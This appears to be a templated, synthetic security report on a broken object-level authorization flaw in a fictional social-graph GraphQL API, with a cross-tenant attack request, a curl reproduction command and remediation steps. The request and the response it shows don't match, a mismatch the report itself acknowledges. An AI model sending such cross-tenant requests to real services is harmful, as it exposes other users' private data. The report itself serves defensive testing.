# Security Analysis Report
**System:** Horizon Social Graph API
**Domain:** Social Media / Identity Graph
**Example ID:** GQL-0311
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.3 | Bulk/list endpoint exposure via `listPosts` — attacker enumerates all social graph posts of a victim tenant by supplying client-controlled `tenantId` |

---

## Finding 1 — BOLA: Bulk/List Endpoint Without Tenancy Validation (Pattern 1.3)

### Summary
The `listPosts` resolver on Horizon Social Graph API (`api.horizon-social-graph.example.com`) accepts a client-supplied `tenantId` parameter without validating it against the JWT's `tenantId`. Per §5.0 Pattern 1.3, the list endpoint returns bulk results for any requested tenant — including records belonging to other users/tenants — without any ownership filtering. The attacker supplies `tenant-558d` in the `listPosts` call while holding a `tenant-79b1` token, receiving all posts from the victim tenant.

**Context.txt inconsistency (documented):** HAR query uses `listPosts(tenantId: "tenant-558d")`, but the response key in §6.0 is `getPost`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`listPosts`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `postId` only (no user/tenant dimension), enabling cross-tenant cache poisoning.

**Pattern:** 1.3 — Bulk or list endpoints (BOLA)
**Affected resolver:** `listPosts`
**Affected endpoint:** `POST https://api.horizon-social-graph.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.horizon-social-graph.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-79b1

{"query": "query VulnerableOp { listPosts(tenantId: \"tenant-558d\") { postId ownerId data { sensitiveField } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Post Data Returned (cross-tenant)**
```json
{
  "data": {
    "getPost": {
      "tenantId": "tenant-558d",
      "ownerId": "other-user-79b1558d",
      "data": {
        "sensitiveField": "CONFIDENTIAL-79b1558d",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-79b1`. Returned data belongs to: `tenant-558d`. Cross-tenant bulk list access confirmed.

**Context.txt inconsistency:** HAR sends `listPosts` query; response body uses key `getPost`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.horizon-social-graph.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-79b1" \
  -d '{"query": "query VulnerableOp { listPosts(tenantId: \"tenant-558d\") { postId ownerId data { sensitiveField } } }"}'
# Vulnerable: data contains tenant-558d social graph posts for attacker tenant-79b1
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `listPosts` resolver: derive `tenantId` exclusively from JWT claims. Reject client-supplied `tenantId`.
2. In `getPost` resolver: assert `fetched.tenantId === jwt.tenantId` post-fetch (RISK-GQL-311).
3. Re-key Redis cache to include `tenantId`.
